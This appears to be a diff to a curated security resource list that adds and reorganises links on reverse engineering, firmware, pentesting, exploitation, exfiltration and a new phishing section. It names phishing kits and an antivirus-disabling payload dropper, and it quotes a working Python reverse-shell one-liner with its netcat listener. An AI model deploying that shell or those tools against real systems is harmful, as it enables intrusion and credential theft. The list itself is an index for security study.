@@ -100,6 +100,7 @@
 - [Malboxes](https://gosecure.net/2017/02/16/introducing-malboxes-a-tool-to-build-malware-analysis-virtual-machines/): a Tool to Build Malware Analysis Virtual Machines, [github](https://github.com/GoSecure/malboxes)
 - [Triton is the world’s most murderous malware, and it’s spreading](https://www.technologyreview.com/s/613054/cybersecurity-critical-infrastructure-triton-malware/)
 - [Cloak and Dagger — Mobile Malware Techniques Demystified](https://medium.com/@targetpractice/cloak-and-dagger-malware-techniques-demystified-c4d8a035b94e)
+- [IceBox](https://github.com/thalium/icebox): Icebox is a Virtual Machine Introspection solution that enable you to stealthily trace and debug any process (kernel or user). It's based on project Winbagility.
 
 ### Samples
 
@@ -180,6 +181,10 @@
   - [Generic Anomalies](https://github.com/Neo23x0/signature-base/blob/master/yara/generic_anomalies.yar#L379): Detects an embedded executable in a non-executable file
 - [Virtuailor](https://github.com/0xgalz/Virtuailor): IDAPython tool for C++ vtables reconstruction.
 - [Linux Reverse Engineering CTFs for Beginners](https://osandamalith.com/2019/02/11/linux-reverse-engineering-ctfs-for-beginners/).
+- [execution-trace-viewer](https://github.com/teemu-l/execution-trace-viewer): Tool for viewing and analyzing execution traces
+- [Reverse Engineering of a Not-so-Secure IoT Device](https://mcuoneclipse.com/2019/05/26/reverse-engineering-of-a-not-so-secure-iot-device/)
+- [ghidra-firmware-utils](https://github.com/al3xtjames/ghidra-firmware-utils): Ghidra utilities for analyzing firmware
+- [dragondance](https://github.com/0ffffffffh/dragondance): Binary code coverage visualizer plugin for Ghidra
 - [Python for Reverse Engineering 1](https://icyphox.sh/blog/python-for-re-1/): ELF Binaries
 - [Kaitai Struct](https://formats.kaitai.io/): A new way to develop parsers for binary structures.
 - [findLoop](https://github.com/secrary/findLoop): find possible encryption/decryption or compression/decompression code.
@@ -188,6 +193,7 @@
 - [mkYARA](https://blog.fox-it.com/2019/03/28/mkyara-writing-yara-rules-for-the-lazy-analyst/): Writing YARA rules for the lazy analyst ([github](https://github.com/fox-it/mkyara))
 - [Reverse Engineering 'A Link to the Past (GBA)' ep 1](https://sideway.re/Reverse-Engineering-alttp-GBA-ep1/)
 - [wiggle](https://github.com/ChiChou/wiggle): The concepting self hosted executable binary search engine.
+- [Python for Reverse Engineering 1](https://icyphox.sh/blog/python-for-re-1/): ELF Binaries
   
 ## Frameworks
 
@@ -289,7 +295,8 @@
 - [HACL*](https://github.com/project-everest/hacl-star): a formally verified cryptographic library written in F*
 - [Villoc](https://github.com/wapiflapi/villoc): Villoc is a heap visualisation tool, it's a python script that renders a static html file.
 - [How C array sizes become part of the binary interface of a library](https://developers.redhat.com/blog/2019/05/06/how-c-array-sizes-become-part-of-the-binary-interface-of-a-library/)
-- [Insecure Direct Object References](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References#tools) 
+- [Insecure Direct Object References](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References#tools)
+- [MazuCC](https://github.com/jserv/MazuCC): A minimalist C compiler with x86_64 code generation
 
 ### Fuzzing
 
@@ -337,6 +344,8 @@
 - [OpenWRT em Mikrotik Routerboard 750](https://wiki.hackstore.com.br/OpenWRT_em_Mikrotik_Routerboard_750_(Linux_on_MIPS_AR7xxx/AR9xxx))
 - [Lexra](https://www.linux-mips.org/wiki/Lexra): Lexra did implement a 32-bit variant of the MIPS architecture.
 - [IntelTEX-PoC](https://github.com/ptresearch/IntelTXE-PoC): Intel Management Engine JTAG Proof of Concept
+- [me_cleaner](https://github.com/corna/me_cleaner): Tool for partial deblobbing of Intel ME/TXE firmware images.
+- [me_removal](https://github.com/nkht/me_removal): Testing complete ME removal on Intel HEDT systems
 - [IDA-scripts](https://github.com/secrary/IDA-scripts/): IDAPro scripts/plugins
 - [Why is My Perfectly Good Shellcode Not Working?](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm): Cache Coherency on MIPS and ARM.
 - [Something about IR optimization](https://brrt-to-the-future.blogspot.com/2019/03/something-about-ir-optimization.html): Hi hackers! Today I want to write about optimizing IR in the MoarVM JIT, and also a little bit about IR design itself.
@@ -406,7 +415,11 @@
 - [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings): A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques!
 - [Penetration Test Guide based on the OWASP + Extra](https://github.com/Voorivex/pentest-guide): This guid is for the penetration testers seeking for the appropriate test cases required during a penetration test project. I rearranged the OWASP Testing Guide v4 from my point of view including 9 Test Classes and each class has several Test Cases to conduct against the target. Each Test Case covers several OWASP tests which also is useful for the report document. I've also added 15 extra Tests Cases marked by the EXTRA-TEST. I hope it will be useful in both penetration test projects and bug-bounty.
   - [Insecure Direct Object References](https://github.com/Voorivex/pentest-guide/tree/master/Insecure-Direct-Object-References) (OTG-AUTHZ-004)
-- [Order of the Overflow Proxy Service](https://github.com/o-o-overflow/dc2019q-ooops): 
+- [Order of the Overflow Proxy Service](https://github.com/o-o-overflow/dc2019q-ooops)
+- [liffy](https://github.com/mzfr/liffy/): Local file inclusion exploitation tool
+- [foxyproxy.json](https://gist.github.com/liamosaur/a527d285b5394180c4bf3197dc7d8035): Some of these might be legacy and no longer catching any traffic, but unless you're actually pentesting Mozilla or Google, it shouldn't matter
+- [pentest_compilation](https://github.com/adon90/pentest_compilation): Compilation of commands, tips and scripts that helped me throughout Vulnhub, Hackthebox, OSCP and real scenarios.
+- [Linux for Pentester](https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/): ZIP Privilege Escalation
 
 ### Vulnerability
 
@@ -435,6 +448,7 @@
   - [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller): Burp extension to perform Java Deserialization Attacks.
   - [BurpBounty](https://github.com/wagiro/BurpBounty): Burp Bounty (Scan Check Builder in BApp Store) is a extension of Burp Suite that improve an active and passiv
 - [Sitadel](https://github.com/shenril/Sitadel): Web Application Security Scanner.
+- [WAF through the eyes of hackers](https://habr.com/ru/company/dsec/blog/454592/)
 
 ### Exploits
 
@@ -445,6 +459,7 @@
 - [unfurl](https://github.com/JLospinoso/unfurl), [An Entropy-Based Link Vulnerability Analysis Tool](https://jlospinoso.github.io/python/unfurl/abrade/hacking/2018/02/08/unfurl-url-analysis.html)
 - [A collection of vulnerable ARM binaries for practicing exploit development](https://github.com/Billy-Ellis/Exploit-Challenges)
 - [A collection of PHP exploit scripts](https://github.com/mattiasgeniar/php-exploit-scripts)
+- [Sage ACF Blocks](https://github.com/generoi/sage-acfblocks): A Sage 10 helper package for building ACF blocks rendered using blade templates.
 - [WebKit exploit](https://github.com/Cryptogenic/Exploit-Writeups/blob/master/WebKit/setAttributeNodeNS%20UAF%20Write-up.md)
 - [Modern Binary Exploitation - Spring 2015](http://security.cs.rpi.edu/courses/binexp-spring2015/)
 - [DriveCrypt](https://github.com/shjalayeri/DriveCrypt): DriveCrypt Dcr.sys vulnerability exploit
@@ -467,6 +482,8 @@
 - [UEFI vulnerabilities classification focused on BIOS implant delivery](https://medium.com/@matrosov/uefi-vulnerabilities-classification-4897596e60af) and [What makes OS drivers dangerous for BIOS?](https://medium.com/@matrosov/dangerous-update-tools-c246f7299459)
 - [MikroTik Firewall & NAT Bypass](https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24)
 - [3D Accelerated Exploitation](https://github.com/mwrlabs/3d-accelerated-exploitation): The content of this repository is meant to be the official release of the tooling/exploit that was discussed during the OffensiveCon 2019 talk - 3D Accelerated Exploitation. The talk dealt with research into the VirtualBox 3D Acceleration feature, which is backed by a software component called Chromium.
+- [GhostDelivery](https://github.com/s1egesystems/GhostDelivery): Python script to generate obfuscated .vbs script that delivers payload (payload dropper) with persistence and windows antivirus disabling functions.
+- [Beat the hole in the ATM](https://medium.com/nightst0rm/t%E1%BA%A3n-m%E1%BA%A1n-v%E1%BB%81-l%E1%BB%97-h%E1%BB%95ng-trong-atm-diebold-f1040a70f2c9): hacking an diebold ATM.
   
 ### Red Team
 
@@ -494,10 +511,9 @@
 ## Exfiltration
 
 - [Script for searching the extracted firmware file system for goodies!](https://github.com/craigz28/firmwalker)
-- [DKMC - Dont kill my cat](https://github.com/Mr-Un1k0d3r/DKMC): - Malicious payload evasion tool
+- [DKMC - Dont kill my cat](https://github.com/Mr-Un1k0d3r/DKMC): Malicious payload evasion tool
 - [Tunna](https://github.com/SECFORCE/Tunna) is a set of tools which will wrap and tunnel any TCP communication over HTTP. It can be used to bypass network restrictions in fully firewalled environments.
 - [gitleaks](https://github.com/zricethezav/gitleaks): Searches full repo history for secrets and keys
-- [Phishing on Twitter](https://github.com/omergunal/PoT)
 - [Twitter Scraper](https://github.com/kennethreitz/twitter-scraper)
 - [Active Directory Control Paths](https://github.com/ANSSI-FR/AD-control-paths)
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound): Six Degrees of Domain Admin, and a [Python](https://github.com/fox-it/BloodHound.py) based ingestor for BloodHound
@@ -518,7 +534,6 @@
 - [Using Google Analytics for data extraction](https://labs.detectify.com/2018/01/19/google-analytics-data-extraction/)
 - [Exfiltrating credentials via PAM backdoors & DNS requests](https://x-c3ll.github.io/posts/PAM-backdoor-DNS/)
 - [Building simple DNS endpoints for exfiltration or C&C](https://x-c3ll.github.io/posts/DNS-endpoint-exfiltration/)
-- [evilginx2](https://github.com/kgretzky/evilginx2): Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication.
 - [CheckPlease](https://github.com/Arvanaghi/CheckPlease): Sandbox evasion modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust.
 - [okhttp-peer-certificate-extractor](https://github.com/fabiomsr/okhttp-peer-certificate-extractor): This tool extracts peer certificates from given certificates.
 - [DET](https://github.com/sensepost/DET): (extensible) Data Exfiltration Toolkit (DET)
@@ -526,6 +541,15 @@
 - [Hamburglar](https://github.com/needmorecowbell/Hamburglar): collect useful information from urls, directories, and files.
 - [Giggity](https://github.com/needmorecowbell/giggity): grab hierarchical data about a github organization, user, or repo.
 - [I saw a python reverse shell, thought it looked a little long (215 chars), so I came up with my own! (107/98 ch)](https://twitter.com/wolfniya/status/1064465658614874112): nc -lnvp 1234 / python3 -c "# 107, single statement, non-blocking __import__("subprocess").Popen("sh",0,None,*[ __import__("socket").create_connection(("127.0.0.1",1234))]*3)"  or "# 98, separators, blocking import subprocess as S,socket; S.run("sh",0,None,*[ socket.create_connection(("127.0.0.1",1234))]*3)"
+
+## Phishing
+
+- [Phishing on Twitter](https://github.com/omergunal/PoT)
+- [evilginx2](https://github.com/kgretzky/evilginx2): Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication.
+- [shellphish](https://github.com/thelinuxchoice/shellphish): Phishing Tool for 18 social media: Instagram, Facebook, Snapchat, Github, Twitter, Yahoo, Protonmail, Spotify, Netflix, Linkedin, Wordpress, Origin, Steam, Microsoft, InstaFollowers, Gitlab, Pinterest
+- [pompa](https://github.com/m1nl/pompa): Fully-featured spear-phishing toolkit - web front-end.
+- [..Modlishka..](https://github.com/drk1wi/Modlishka): Modlishka is a flexible and powerful reverse proxy, that will take your phishing campaigns to the next level (with minimal effort required from your side).
+- [Using phishing tools against the phishers](https://medium.com/mycrypto/using-phishing-tools-against-the-phishers-and-uncovering-a-massive-binance-phishing-campaign-58132e2f0e09) — and uncovering a massive Binance phishing campaign.
 
 ## Forensics
 
@@ -548,6 +572,7 @@
 
 - (pt-br)[Analisando ameaças com Mitre ATT&CK Navigator](https://medium.com/blueops/mitre-navigator-9aa9d1aeb570)
 - [ATT&CK™ Navigator](https://mitre.github.io/attack-navigator/enterprise/): Web app that provides basic navigation and annotation of ATT&CK matrices [github](https://github.com/mitre/attack-navigator).
+- [Awesome Honeypots](https://github.com/paralax/awesome-honeypots): A curated list of awesome honeypots, plus related components and much more, divided into categories such as Web, services, and others, with a focus on free and open source projects.
 
 ### Threat Hunting
 
@@ -588,6 +613,7 @@
 
 - [uefi-jitfuck](https://github.com/m4tx/uefi-jitfuck): A JIT compiler for Brainfuck running on x86_64 UEFI
 - [Secure Boot in the Era of the T2](https://duo.com/labs/research/secure-boot-in-the-era-of-the-t2): Continuing our series on Apple’s new T2 platform and examining the role it plays in Apple’s vision of Secure Boot.
+- [PSPTool](https://github.com/cwerling/psptool): Display, extract, and manipulate PSP firmware inside UEFI images
 
 ### Windows
 
@@ -784,6 +810,9 @@
 - [tpotce](https://github.com/dtag-dev-sec/tpotce): T-Pot Universal Installer and ISO Creator.
 - [Linux Privilege Escalation via LXD & Hijacked UNIX Socket Credentials](https://shenaniganslabs.io/2019/05/21/LXD-LPE.html): LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.
 - [Linux Kernel exploitation Tutorial.](https://github.com/Lazenca/Kernel-exploit-tech)
+- [The 101 of ELF files on Linux](https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/): Understanding and Analysis - Linux Audit
+- [ebpf_exporter](https://github.com/cloudflare/ebpf_exporter): Prometheus exporter for custom eBPF metrics
+- [Zydra](https://github.com/hamedA2/Zydra): is a file password recovery tool and Linux shadow file cracker. It uses the dictionary search or Brute force method for cracking passwords.
 
 ## Risk Assessment
 
@@ -879,7 +908,6 @@
 - [hexyl](https://github.com/sharkdp/hexyl): A command-line hex viewer.
 - [Giggity](https://github.com/needmorecowbell/giggity): Wraps github api for openly available information about an organization, user, or repo.
 - [howmanypeoplearearound](https://github.com/schollz/howmanypeoplearearound): Count the number of people around you ￼ by monitoring wifi signals .
-- [pompa](https://github.com/m1nl/pompa): Fully-featured spear-phishing toolkit - web front-end.
 - [LASCAR](https://github.com/Ledger-Donjon/lascar): Ledger's Advanced Side-Channel Analysis Repository.
 - [Hostintel](https://www.kitploit.com/2019/03/hostintel-modular-python-application-to.html): A Modular Python Application To Collect Intelligence For Malicious Hosts - [github](https://github.com/keithjjones/hostintel)
 - [DarkNet_ChineseTrading](https://github.com/aoii103/DarkNet_ChineseTrading)
@@ -897,7 +925,6 @@
 - [Crockford’s base 32 encoding](https://www.johndcook.com/blog/2018/12/28/base-32-and-base-64-encoding/): Crockford’s base 32 encoding is a compromise between efficiency and human legibility.
 - [Sputnik](https://medium.com/bugbountywriteup/sputnik-an-open-source-intelligence-browser-extension-da2f2c22c8ec) -An Open Source Intelligence Browser Extension
 - [PCredz](https://github.com/lgandx/PCredz): This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.
-- [..Modlishka..](https://github.com/drk1wi/Modlishka): Modlishka is a flexible and powerful reverse proxy, that will take your phishing campaigns to the next level (with minimal effort required from your side).
 - [uncaptcha2](https://github.com/ecthros/uncaptcha2): defeating the latest version of ReCaptcha with 91% accuracy
 - [Nefarious LinkedIn](https://github.com/dandrews/nefarious-linkedin): A look at how LinkedIn spies on its users.
 
@@ -947,6 +974,7 @@
 - [Vulncode-DB project](https://github.com/google/vulncode-db): The vulnerable code database (Vulncode-DB) is a database for vulnerabilities and their corresponding source code if available.
 - [One-End Encryption (OEE)](https://github.com/veorq/oee): Stronger than End-to-End Encryption
 - [Configuring MTA-STS and TLS Reporting For Your Domain](https://isc.sans.edu/forums/diary/Configuring+MTASTS+and+TLS+Reporting+For+Your+Domain/24840/)
+
 ---
 
 ## Conferences and Slides
@@ -1051,6 +1079,7 @@ Some good places to visit:
 - [The Hunt for 3ve](https://services.google.com/fh/files/blogs/3ve_google_whiteops_whitepaper_final_nov_2018.pdf): Taking down a major ad fraud operation through industry collaboration.
 - [Page Cache Attacks](https://arxiv.org/abs/1901.01161): We present a new hardware-agnostic side-channel attack that targets one of the most fundamental software caches in modern computer systems: the operating system page cache.
 - [Identification and Illustration of Insecure Direct Object References and their Countermeasures](https://www.researchgate.net/publication/307580906_Identification_and_Illustration_of_Insecure_Direct_Object_References_and_their_Countermeasures)
+- [China’s Maxim](https://scholarcommons.usf.edu/cgi/viewcontent.cgi?article=1050&context=mca): Leave No Access Point Unexploited: The Hidden Story of China Telecom’s BGP Hijacking
 
 ---
 
